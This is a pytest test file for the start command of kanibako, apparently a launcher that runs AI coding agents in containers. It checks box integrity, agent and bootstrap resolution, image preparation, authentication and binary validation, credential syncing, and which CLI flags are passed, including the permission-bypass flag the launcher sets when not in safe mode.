"""Tests for kanibako.commands.start."""

from __future__ import annotations

import argparse
from contextlib import contextmanager
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from kanibako.commands.start import (
    _apply_tweakcc,
    _check_box_components,
    _run_container,
    run_start,
)
from kanibako.settings.paths import BoxMode
from kanibako.settings.settings_launch import AuthSource
from kanibako.targets.base import PersonaProbeOutcome


def _sel(node: str, source: str = "settings"):
    """The P7 ``select_agent`` return shape (was a bare node-name string).

    ``AgentSelection`` carries the node AND where it came from, so the launch can
    install the resolved selection at ``system.agent`` (the §1A level) — which is
    what keeps the snapshot equal to the agent that actually runs.
    """
    from kanibako.settings.agent_select import AgentSelection

    return AgentSelection(node=node, source=source)


# Auth-level redesign: the boolean ``effective_group_auth`` was replaced by an
# ``AuthSource`` (``kanibako.settings.settings_launch``).  These two module-level
# constants stand in for the two ends the old bool covered:
#   * ``_SHARED_AUTH`` — a sharing box (``.creds_shared`` True; old ``group_auth=True``).
#     A minimal GLOBAL-tier source (the common shared case).
#   * ``_PRIVATE_AUTH`` — a private/distinct box (``.creds_shared`` False; tier "box";
#     old ``group_auth=False``).  ``_selected_source_root`` is ``None`` → the
#     credsync primitives no-op.
# Tests that need PRIVATE behavior must patch ``_resolve_box_auth_source`` to
# return ``_PRIVATE_AUTH`` explicitly: ``start_mocks`` leaves that resolver REAL,
# and against the MagicMock ``proj`` it resolves to the GLOBAL tier (creds_shared True).
_SHARED_AUTH = AuthSource(
    tier="global",
    global_enabled=True,
    workset_enabled=False,
    global_sync=False,
    workset_source=None,
)
_PRIVATE_AUTH = AuthSource(
    tier="box",
    global_enabled=False,
    workset_enabled=False,
    global_sync=False,
    workset_source=None,
)


class TestCheckBoxComponents:
    """P6d3 D5 CRITICAL integrity tier: a resolved box's required host-side
    components (workspace + home) must exist before launch — else an error
    message aborts the launch.  The settings-file marker is NOT re-checked here
    (covered by resolution/detection); the vault is NON-CRITICAL (warn only)."""

    def _proj(self, tmp_path, *, make_workspace=True, make_home=True):
        from kanibako.settings.paths import BoxMode, ProjectPaths
        from kanibako.utils import project_hash

        root = tmp_path / "box"
        root.mkdir()
        workspace = root / "workspace"
        home = root / "box_data" / "home"
        if make_workspace:
            workspace.mkdir(parents=True)
        if make_home:
            home.mkdir(parents=True)
        return ProjectPaths(
            project_path=workspace,
            project_hash=project_hash(str(root)),
            metadata_path=root,
            shell_path=home,
            vault_ro_path=root / "vault" / "ro",
            vault_rw_path=root / "vault" / "rw",
            mode=BoxMode.standalone,
            name="aaaaa_box",
        )

    def test_healthy_box_returns_none(self, tmp_path):
        # Regression guard: all components present → no error.
        assert _check_box_components(self._proj(tmp_path)) is None

    def test_missing_workspace_errors(self, tmp_path):
        # Mutation: drop the workspace branch → this returns None → RED here.
        proj = self._proj(tmp_path, make_workspace=False)
        msg = _check_box_components(proj)
        assert msg is not None
        assert "workspace" in msg
        assert str(proj.project_path) in msg

    def test_missing_home_errors(self, tmp_path):
        # Mutation: drop the home branch → this returns None → RED here.
        proj = self._proj(tmp_path, make_home=False)
        msg = _check_box_components(proj)
        assert msg is not None
        assert "home" in msg
        assert str(proj.shell_path) in msg

    def test_missing_settings_file_not_double_checked(self, tmp_path):
        """#3 — the settings-file marker is NOT re-checked at launch: a proj
        whose workspace + home exist passes even with no settings.yaml (the
        marker's absence is handled at resolution/detection, not double-fired
        here — see box_resolve.standalone_settings_present below)."""
        proj = self._proj(tmp_path)  # no settings.yaml written anywhere
        assert not (proj.metadata_path / "settings.yaml").exists()
        assert _check_box_components(proj) is None

    def test_marker_absence_is_a_resolution_concern(self, tmp_path):
        """#3 (cont.) — the settings-file marker IS the box signal at the
        RESOLUTION layer: a standalone root is only recognised as a box when its
        settings.yaml is present, so a missing marker → 'not a box' there (never
        double-checked at launch)."""
        from kanibako.launch import box_resolve

        root = tmp_path / "sbox"
        (root / "box_data").mkdir(parents=True)
        # box_data present but NO settings.yaml → not recognised as a box.
        assert not box_resolve.standalone_settings_present(root)
        (root / "settings.yaml").write_text("project: {mode: standalone}\n")
        assert box_resolve.standalone_settings_present(root)

    def test_wired_into_run_container(self, start_mocks, tmp_path, capsys):
        """The gate is wired into ``_run_container``: a resolved box whose
        workspace is missing aborts the launch (rc=1) BEFORE the container runs
        and BEFORE the baseline probe."""
        missing_ws = tmp_path / "gone" / "workspace"  # never created
        with start_mocks() as m:
            m.proj.project_path = missing_ws
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
        assert rc == 1
        assert "workspace" in capsys.readouterr().err
        m.runtime.run.assert_not_called()
        m.launch_check.assert_not_called()


class TestTargetWarnings:
    """Verify warnings when target detection fails."""

    def test_detect_returns_none_warns(self, start_mocks, capsys):
        """When detect() returns None, a warning should be printed."""
        with start_mocks() as m:
            m.target.detect.return_value = None
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )

        captured = capsys.readouterr()
        assert "Warning:" in captured.err
        assert "binary not found" in captured.err

    def test_no_agent_target_suppresses_warning(self, start_mocks, capsys):
        """When target has_binary=False and detect() returns None, no warning is printed."""
        with start_mocks() as m:
            m.target.detect.return_value = None
            m.target.has_binary = False
            m.target.name = "no_agent"
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )

        captured = capsys.readouterr()
        assert "Warning:" not in captured.err

    def test_detect_returns_none_still_launches(self, start_mocks):
        """Container should still launch even when detection fails."""
        with start_mocks() as m:
            m.target.detect.return_value = None
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.runtime.run.assert_called_once()

    def test_launch_passes_the_canon_reprotect_hook_to_run(self, start_mocks):
        """⚑ THE WIRING. ``runtime.run`` gets a ``post_start`` callable, and that
        callable re-protects the canon skeleton of THIS box's home.

        This is the mutation-honest half: deleting ``post_start=`` from the
        ``runtime.run(...)`` call in ``_run_container`` makes this RED. Without it
        the whole re-protect mechanism could be wired correctly inside
        ``ContainerRuntime`` and never actually reached from a launch.
        """
        from unittest.mock import patch as _patch

        with start_mocks() as m:
            m.target.detect.return_value = None
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            hook = m.runtime.run.call_args.kwargs.get("post_start")
            assert callable(hook), (
                "runtime.run must receive a post_start hook — podman's :U re-chowns "
                "the home bind source at container creation, undoing the canon "
                "ownership box create established"
            )

            # And it must re-protect THIS box's home, not merely be some callable.
            with _patch(
                "kanibako.settings.core_defaults.materialize_canon_skeleton"
            ) as m_protect:
                hook()
            m_protect.assert_called_once()
            assert m_protect.call_args.args[0] == m.proj.shell_path

    def test_no_agent_target_still_launches(self, start_mocks):
        """Container should still launch with no_agent target."""
        with start_mocks() as m:
            m.target.detect.return_value = None
            m.target.has_binary = False
            m.target.name = "no_agent"
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.runtime.run.assert_called_once()

    def test_shell_mode_skips_target(self, start_mocks, capsys):
        """When entrypoint is set, target detection is skipped entirely."""
        with start_mocks() as m:
            m.resolve_target.side_effect = KeyError("should not be called")
            _run_container(
                project_dir=None,
                entrypoint="/bin/bash",
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )

        captured = capsys.readouterr()
        assert "Warning:" not in captured.err


class TestResolveBeforeImage:
    """Agent resolution must run BEFORE image pull + the tmux baseline check.

    W1 §Design 7: "resolve config FIRST ... before anything else."  A user with
    2+ agents and no default must hit the Gate-2a "pick an agent" error
    immediately — not after paying a full image pull (ensure_image) and then a
    tmux baseline error.
    """

    def test_gate2a_raises_before_image_and_baseline(self, start_mocks):
        from kanibako.errors import NoAgentSelectedError

        with start_mocks() as m:
            m.resolve_agent.side_effect = NoAgentSelectedError("pick one")
            with pytest.raises(NoAgentSelectedError):
                _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                    persistent=True,
                )
            # Resolution failed up front: neither the image pull nor the tmux
            # baseline probe was reached.
            m.runtime.ensure_image.assert_not_called()
            m.launch_check.assert_not_called()

    def test_shell_mode_skips_resolution(self, start_mocks):
        """`kanibako shell` (box_shell_mode) never calls resolve_agent."""
        with start_mocks() as m:
            m.resolve_agent.side_effect = AssertionError("must not resolve")
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
                box_shell_mode=True,
            )
            assert rc == 0
            m.resolve_agent.assert_not_called()


class TestBootstrapNoneInRunContainer:
    """`none` opt-out at the _run_container consumer: the AGENT-scope ``bootstrap``
    value resolves to ``none`` (spec §2d) and forces a clean error under
    persistent mode, so no caller can reach the bootstrap-wrap with `none`."""

    def _kwargs(self, **over):
        base = dict(
            project_dir=None,
            entrypoint=None,
            image_override=None,
            new_session=False,
            safe_mode=False,
            resume_mode=False,
            extra_args=[],
        )
        base.update(over)
        return base

    def test_none_blocks_persistent(self, start_mocks, capsys):
        """Resolved agent-scope ``bootstrap='none'`` under persistent is a clean
        error (rc=1) BEFORE the baseline probe/launch.

        Pins the none-guard: if `none` were mishandled to tmux, no_bootstrap would
        be False, the guard would not fire, and the launch would proceed
        (launch_check called) — so this goes red on a re-swallow."""
        with start_mocks() as m:
            m.effective_bootstrap.return_value = "none"
            rc = _run_container(**self._kwargs(persistent=True))
        assert rc == 1
        # Guard fires before the image baseline probe and before any launch.
        m.launch_check.assert_not_called()
        m.runtime.run.assert_not_called()
        err = capsys.readouterr().err
        assert "agent.default.bootstrap=none" in err
        assert "cannot run a persistent session" in err

    def test_default_bootstrap_is_tmux(self, start_mocks):
        """The unset/default agent-scope bootstrap resolves to tmux: the none-guard
        does NOT fire, and a persistent launch proceeds to the baseline probe.

        Complement to the none test — proves only the exact `none` sentinel opts
        out (the fixture default is tmux)."""
        with start_mocks() as m:
            rc = _run_container(**self._kwargs(persistent=True))
        assert rc == 0
        # Default tmux → not the none-guard → baseline probe ran.
        m.launch_check.assert_called_once()

    def test_none_non_persistent_skips_bootstrap_probe(self, start_mocks):
        """Non-persistent `none` launch proceeds (foreground) and the persistent
        baseline probe is skipped entirely (persistent=False path)."""
        with start_mocks() as m:
            m.effective_bootstrap.return_value = "none"
            rc = _run_container(**self._kwargs(persistent=False))
        assert rc == 0
        # Non-persistent path never runs the (persistent-only) baseline probe.
        m.launch_check.assert_not_called()


class TestEffectiveBootstrapResolution:
    """`_effective_bootstrap` resolves the AGENT-scope ``bootstrap`` behavior key
    (spec §2d) off the settings snapshot, with the ``tmux`` consumer default —
    the relocation of the retired box-scope ``box.bootstrap_program``.  It resolves
    exactly like ``model`` / ``access``: the ``agent.default`` tier lives in the
    SYSTEM settings file (a box/workset file's ``agent.*`` is an upward write, dropped
    by directional enforcement), a per-agent override in the agent's OWN file, and a
    box-level tweak via the ``box.agent.*`` mirror."""

    def _proj(self, tmp_path):
        from types import SimpleNamespace
        from kanibako.settings.paths import BoxMode
        box_dir = tmp_path / "box"
        box_dir.mkdir()
        # PRIMARY with no group → the tier pair is (box_dir/settings.yaml, None):
        # a box tier and NO workset-tier file, which keeps the test focused on the
        # system/agent cascade.  ``mode`` is required because the tier pair is
        # mode-aware (``box_workset_settings_paths``); it is NOT standalone — that
        # mode's box tier would be box_dir/box_data/settings.yaml.
        return SimpleNamespace(
            metadata_path=box_dir, group=None, mode=BoxMode.primary,
        )

    def test_default_is_tmux_when_unset(self, tmp_path):
        from kanibako.commands.start import _effective_bootstrap
        proj = self._proj(tmp_path)
        # No settings file anywhere → the consumer default.
        assert _effective_bootstrap(proj, None, "claude") == "tmux"

    def test_system_agent_default_tier_wins(self, tmp_path):
        """A bare ``bootstrap`` set at system scope lands in the system settings
        file's ``agent.default`` tier and is the effective value for any agent."""
        from kanibako.commands.start import _effective_bootstrap
        from kanibako.settings.config_io import dump_doc
        proj = self._proj(tmp_path)
        sys_file = tmp_path / "system.yaml"
        dump_doc(sys_file, {"agent": {"default": {"bootstrap": "zellij"}}})
        assert _effective_bootstrap(proj, sys_file, "claude") == "zellij"
        # And for a no-agent / shell box (agent.default backstop still applies).
        assert _effective_bootstrap(proj, sys_file, "general") == "zellij"

    def test_none_sentinel_preserved(self, tmp_path):
        """The ``none`` opt-out is a real value, NOT coerced to the tmux default."""
        from kanibako.commands.start import _effective_bootstrap
        from kanibako.settings.config_io import dump_doc
        proj = self._proj(tmp_path)
        sys_file = tmp_path / "system.yaml"
        dump_doc(sys_file, {"agent": {"default": {"bootstrap": "none"}}})
        assert _effective_bootstrap(proj, sys_file, "claude") == "none"

    def test_box_pref_override(self, tmp_path):
        """A box-level tweak via the §2h REQUEST ``pref.agent.<a>.bootstrap`` WINS
        the §2d pick — the box's override takes effect. (⮕ P7: was the
        ``box.agent.bootstrap`` mirror, retired by spec §2b.)"""
        from kanibako.commands.start import _effective_bootstrap
        from kanibako.settings.config_io import dump_doc
        proj = self._proj(tmp_path)
        sys_file = tmp_path / "system.yaml"
        dump_doc(sys_file, {"agent": {"default": {"bootstrap": "zellij"}}})
        dump_doc(
            proj.metadata_path / "settings.yaml",
            {"pref": {"agent": {"claude": {"bootstrap": "none"}}}},
        )
        assert _effective_bootstrap(proj, sys_file, "claude") == "none"

    def test_box_pref_is_sole_agent_scope_setting(self, tmp_path):
        """REGRESSION (F1): the box's REQUEST as the SOLE agent-scope setting — NO
        system ``agent.default.bootstrap``, NO agent-file behavior — must still be
        honored (the retired ``box.bootstrap_program=none`` worked here).

        Mutation-proof: this only passes because ``_effective_bootstrap`` seeds
        ``behavior_floor={"bootstrap": tmux}`` so the snapshot's ``agent`` node exists
        and ``effective_behavior`` reaches the pref-installed value.  Drop that floor
        and the snapshot has no ``agent`` node → ``effective_behavior`` early-returns
        ``{}`` → this returns ``'tmux'`` and the box wrongly launches persistent."""
        from kanibako.commands.start import _effective_bootstrap
        from kanibako.settings.config_io import dump_doc
        proj = self._proj(tmp_path)
        # ONLY the box's §2h request is set — no system file at all.
        dump_doc(
            proj.metadata_path / "settings.yaml",
            {"pref": {"agent": {"claude": {"bootstrap": "none"}}}},
        )
        assert _effective_bootstrap(proj, None, "claude") == "none"

    def test_per_agent_override_from_agent_file_wins(self, tmp_path):
        """A per-agent ``agent.<agent>.bootstrap`` stored in the agent's OWN file
        (flat ``agent:`` state) WINS the §2d active-over-default pick for that
        agent, over the system-scope ``agent.default`` value."""
        from kanibako.commands.start import _effective_bootstrap
        from kanibako.settings.config_io import dump_doc
        proj = self._proj(tmp_path)
        sys_file = tmp_path / "system.yaml"
        dump_doc(sys_file, {"agent": {"default": {"bootstrap": "zellij"}}})
        agent_file = tmp_path / "agents" / "claude" / "settings.yaml"
        agent_file.parent.mkdir(parents=True)
        dump_doc(agent_file, {"self": {"bootstrap": "none"}})
        # The active agent (claude) picks its own-file override over the default.
        assert _effective_bootstrap(
            proj, sys_file, "claude", agent_path=agent_file,
        ) == "none"
        # A DIFFERENT agent (no matching per-agent slot) still sees the default.
        assert _effective_bootstrap(proj, sys_file, "goose") == "zellij"


class TestImageReferenceResolution:
    """Verify a bare configured image is resolved before ensure_image (#81)."""

    def test_bare_image_resolved_to_prefixed(self, start_mocks):
        with start_mocks() as m:
            m.load_config.return_value.box_image = (
                "ghcr.io/doctorjei/kanibako-oci:latest"
            )
            m.merged.box_image = "kanibako-lxc"
            # Nothing exists locally: bare name is a prefab needing a pull.
            m.runtime.image_exists.return_value = False
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            ensured = m.runtime.ensure_image.call_args[0][0]
            assert ensured == "ghcr.io/doctorjei/kanibako-lxc:latest"
            m.runtime.rebuild.assert_not_called()

    def test_local_image_used_as_is(self, start_mocks):
        with start_mocks() as m:
            m.load_config.return_value.box_image = (
                "ghcr.io/doctorjei/kanibako-oci:latest"
            )
            m.merged.box_image = "kanibako-lxc"
            # Only the resolved prefab reference exists locally; no
            # kanibako-template-/kanibako-rig- image does, so the resolver
            # classifies it as a prefab with prep_action="none".
            m.runtime.image_exists.side_effect = (
                lambda img: img == "kanibako-lxc:latest"
            )
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            ensured = m.runtime.ensure_image.call_args[0][0]
            assert ensured == "kanibako-lxc:latest"
            m.runtime.rebuild.assert_not_called()


class TestRigPrep:
    """Verify resolver-driven prep: templates BUILD, prefabs keep ensure_image."""

    def test_template_bare_name_builds_when_absent(self, start_mocks):
        """A bare template name whose image is absent → runtime.rebuild()."""
        from pathlib import Path

        from kanibako.runtime.rig_resolve import RigResolution

        cf = Path("/bundled/containers/Containerfile.template-jvm")
        res = RigResolution(
            name="jvm",
            kind="template",
            image="kanibako-template-jvm",
            prep_action="build",
            containerfile=cf,
        )
        with start_mocks() as m:
            m.merged.box_image = "jvm"
            # Template image absent → build branch.
            m.runtime.image_exists.return_value = False
            m.runtime.rebuild.return_value = 0
            with patch(
                "kanibako.commands.start.resolve_rig", return_value=res
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m.runtime.rebuild.assert_called_once()
            built_image, built_cf, built_ctx = m.runtime.rebuild.call_args[0][:3]
            assert built_image == "kanibako-template-jvm"
            assert built_cf == cf
            assert built_ctx == cf.parent
            m.runtime.ensure_image.assert_not_called()
            # Container still launches with the built template image.
            m.runtime.run.assert_called_once()

    def test_template_build_failure_returns_1(self, start_mocks, capsys):
        """A non-zero rebuild exit code aborts start with code 1."""
        from pathlib import Path

        from kanibako.runtime.rig_resolve import RigResolution

        res = RigResolution(
            name="jvm",
            kind="template",
            image="kanibako-template-jvm",
            prep_action="build",
            containerfile=Path("/bundled/Containerfile.template-jvm"),
        )
        with start_mocks() as m:
            m.merged.box_image = "jvm"
            m.runtime.image_exists.return_value = False
            m.runtime.rebuild.return_value = 7
            with patch(
                "kanibako.commands.start.resolve_rig", return_value=res
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                )
            assert rc == 1
            m.runtime.run.assert_not_called()
        assert "failed to build rig" in capsys.readouterr().err

    def test_prefab_uses_ensure_image_not_rebuild(self, start_mocks):
        """A prefab → runtime.ensure_image with the resolved ref; no rebuild."""
        from kanibako.runtime.rig_resolve import RigResolution

        res = RigResolution(
            name="oci",
            kind="prefab",
            image="ghcr.io/doctorjei/kanibako-oci:latest",
            prep_action="pull",
            source_ref="oci",
        )
        with start_mocks() as m:
            m.merged.box_image = "oci"
            with patch(
                "kanibako.commands.start.resolve_rig", return_value=res
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            ensured = m.runtime.ensure_image.call_args[0][0]
            assert ensured == "ghcr.io/doctorjei/kanibako-oci:latest"
            m.runtime.rebuild.assert_not_called()

    def test_already_local_template_uses_ensure_image(self, start_mocks):
        """An already-prepped template (containerfile UNSET) → ensure_image, no rebuild."""
        from kanibako.runtime.rig_resolve import RigResolution

        res = RigResolution(
            name="jvm",
            kind="template",
            image="kanibako-template-jvm",
            prep_action="none",
        )
        with start_mocks() as m:
            m.merged.box_image = "jvm"
            with patch(
                "kanibako.commands.start.resolve_rig", return_value=res
            ):
                rc = _run_container(
                    project_dir=None,
                    entrypoint=None,
                    image_override=None,
                    new_session=False,
                    safe_mode=False,
                    resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            ensured = m.runtime.ensure_image.call_args[0][0]
            assert ensured == "kanibako-template-jvm"
            m.runtime.rebuild.assert_not_called()


class TestCheckAuth:
    """Verify pre-launch auth check behavior."""

    def test_auth_failure_returns_1(self, start_mocks, capsys):
        """When check_auth() returns False, start returns 1."""
        with start_mocks() as m:
            m.target.check_auth.return_value = False
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 1
            m.runtime.run.assert_not_called()

        captured = capsys.readouterr()
        assert "Authentication failed" in captured.err

    def test_auth_success_proceeds(self, start_mocks):
        """When check_auth() returns True, container launches normally."""
        with start_mocks() as m:
            m.target.check_auth.return_value = True
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.runtime.run.assert_called_once()

    def test_auth_skipped_without_install(self, start_mocks):
        """When detect() returns None, check_auth is not called."""
        with start_mocks() as m:
            m.target.detect.return_value = None
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.check_auth.assert_not_called()

    def test_auth_skipped_in_shell_mode(self, start_mocks):
        """In shell mode (entrypoint set), check_auth is not called."""
        with start_mocks() as m:
            rc = _run_container(
                project_dir=None,
                entrypoint="/bin/bash",
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.check_auth.assert_not_called()


class TestAgentBinaryValidation:
    """Verify the launch path fails fast on a corrupt/empty host binary."""

    def test_zero_byte_binary_fails_fast(self, start_mocks, capsys, tmp_path):
        """A detected agent whose host binary is 0 bytes -> return 1, no run.

        Routes a real 0-byte tmp file through the real validation helper to
        exercise the guard end-to-end (a 0-byte file passes is_file() yet
        would be exec'd into a brick).

        IMPORTANT: this test does NOT mock check_auth.  In the real launch
        path target.check_auth() shells out to the host agent binary, so a
        0-byte/corrupt binary there raises an uncaught OSError (Exec format
        error) -> Python traceback.  The validation guard MUST run *before*
        check_auth so the user gets the actionable message instead.  We make
        check_auth raise OSError to mimic the real crash; if the guard runs
        first (as it must), check_auth is never reached and the OSError never
        surfaces.
        """
        from kanibako.targets.base import _validate_agent_binary

        binary = tmp_path / "claude"
        binary.touch()  # 0 bytes
        binary.chmod(0o755)
        with start_mocks() as m:
            m.target.detect.return_value.binary = binary
            # Drive the guard through the real helper for fidelity.
            m.validate_binary.side_effect = _validate_agent_binary
            # Mimic the real check_auth crashing on a corrupt binary.  The guard
            # must short-circuit before this is ever called.
            m.target.check_auth.side_effect = OSError(
                8, "Exec format error"
            )
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 1
            m.runtime.run.assert_not_called()
            # Proof the guard ran first: the crashing auth probe was skipped.
            m.target.check_auth.assert_not_called()

        captured = capsys.readouterr()
        assert "host binary is unusable" in captured.err
        assert "0 bytes" in captured.err
        assert str(binary) in captured.err
        assert "diagnose" in captured.err
        # No traceback leaked to stderr.
        assert "Traceback" not in captured.err
        assert "Exec format error" not in captured.err

    def test_nonexecutable_binary_fails_fast(
        self, start_mocks, capsys, tmp_path
    ):
        """A detected agent whose host binary lacks the exec bit -> return 1."""
        from kanibako.targets.base import _validate_agent_binary

        binary = tmp_path / "claude"
        binary.write_text("#!/bin/sh\n")
        binary.chmod(0o644)  # not executable
        with start_mocks() as m:
            m.target.detect.return_value.binary = binary
            m.validate_binary.side_effect = _validate_agent_binary
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 1
            m.runtime.run.assert_not_called()

        captured = capsys.readouterr()
        assert "not executable" in captured.err

    def test_valid_binary_launches(self, start_mocks, tmp_path):
        """A detected agent with a valid non-zero executable binary -> launches."""
        from kanibako.targets.base import _validate_agent_binary

        binary = tmp_path / "claude"
        binary.write_text("#!/bin/sh\nexec claude-real \"$@\"\n")
        binary.chmod(0o755)
        with start_mocks() as m:
            m.target.detect.return_value.binary = binary
            m.validate_binary.side_effect = _validate_agent_binary
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.runtime.run.assert_called_once()


class TestDistinctAuth:
    """Verify distinct auth skips host credential sync."""

    def test_distinct_auth_skips_refresh(self, start_mocks):
        """A PRIVATE box (auth_src.creds_shared False) -> refresh_credentials skipped."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_PRIVATE_AUTH, None, None),
        ):
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.refresh_credentials.assert_not_called()
            m.target.writeback_credentials.assert_not_called()

    def test_distinct_auth_skips_check_auth(self, start_mocks):
        """A PRIVATE box (auth_src.creds_shared False) -> check_auth skipped."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_PRIVATE_AUTH, None, None),
        ):
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.check_auth.assert_not_called()

    def test_shared_auth_calls_refresh(self, start_mocks):
        """A SHARING box (auth_src.creds_shared True) -> refresh_credentials is called.

        Pins the legacy (descriptor-less) credential hook: a descriptor-bearing
        target routes refresh through the credsync engine instead, covered by
        TestCredsyncRouting.test_descriptor_refresh_uses_refresh_cred_files.
        The real ``_resolve_box_auth_source`` (unpatched here) resolves the
        MagicMock proj to the GLOBAL tier, so ``.creds_shared`` is True.
        """
        with start_mocks() as m:
            m.target.descriptor = None
            rc = _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.refresh_credentials.assert_called_once()


class TestStartArgs:
    """Verify CLI args are correctly passed through to container."""

    def test_claude_mode_adds_skip_permissions(self, start_mocks):
        """Default (no entrypoint) should inject --dangerously-skip-permissions."""
        with start_mocks() as m:
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=False,
                resume_mode=False,
                extra_args=[],
            )

            call_kwargs = m.runtime.run.call_args
            cli_args = call_kwargs.kwargs.get("cli_args", [])
            assert "--dangerously-skip-permissions" in cli_args
            assert "--continue" in cli_args

    def test_safe_mode_skips_permissions(self, start_mocks):
        with start_mocks() as m:
            m.proj.is_new = True
            _run_container(
                project_dir=None,
                entrypoint=None,
                image_override=None,
                new_session=False,
                safe_mode=True,
                resume_mode=False,
                extra_args=[],
            )

            call_kwargs = m.runtime.run.call_args
            cli_args = call_kwargs.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" not in cli_args


class TestDescriptorLaunchPath:
    """Step 1e: a descriptor-bearing target assembles argv/env declaratively.

    These drive _run_container with claude's REAL descriptor and assert the
    assembled cli_args / env that reach runtime.run match the legacy behavior.
    """

    def _drive(self, m):
        from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
        m.target.name = "claude"
        m.target.descriptor = _CLAUDE_DESCRIPTOR
        # No declared setting descriptors -> effective_state = crab state verbatim.
        m.target.setting_descriptors.return_value = []
        m.agent_cfg.state = {"model": "opus"}
        m.load_agent_config.return_value = m.agent_cfg

    def test_default_continue_model_and_env(self, start_mocks):
        with start_mocks() as m:
            self._drive(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            cli_args = kw.get("cli_args") or []
            env = kw.get("env") or {}
            assert "--continue" in cli_args
            assert "--dangerously-skip-permissions" in cli_args
            assert cli_args[cli_args.index("--model") + 1] == "opus"
            assert env.get("DISABLE_AUTOUPDATER") == "1"
            assert env.get("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC") == "1"
            # build_cli_args / apply_state are bypassed on the descriptor path.
            m.target.build_cli_args.assert_not_called()
            m.target.apply_state.assert_not_called()

    def test_secure_omits_bypass(self, start_mocks):
        with start_mocks() as m:
            self._drive(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=True, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" not in cli_args
            assert "--continue" in cli_args

    def test_persisted_access_restricted_omits_bypass(self, start_mocks):
        """Persisted ``agent.default.access=restricted`` (no -S/-A) resolves off
        the snapshot via effective_behavior -> bypass ABSENT.  This is the whole
        point of the key (the writer has a reader)."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "restricted"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" not in cli_args

